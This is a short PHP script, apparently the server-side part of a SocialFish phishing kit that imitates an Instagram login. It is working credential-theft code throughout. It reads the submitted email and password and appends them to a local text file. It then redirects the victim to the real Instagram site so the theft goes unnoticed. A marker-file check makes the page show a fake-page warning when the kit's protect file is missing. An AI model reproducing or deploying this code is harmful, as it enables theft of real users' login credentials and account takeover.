<?php
$var = $_POST['email'];
$var2 = $_POST['pass'];
$myFile = file_get_contents("protect.html");
$searchString = "<html><title>There's a Phishing Page generated by SocialFish in this website.</title></html>";
if($myFile == $searchString) {
    file_put_contents("cat.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "\n", FILE_APPEND);
    header('Location: https://www.instagram.com/');
}
if($myFile != $searchString) {
    echo "***ALERT! I AM A FAKE PAGE | DO NOT TRUST ME";
}
exit();
?>

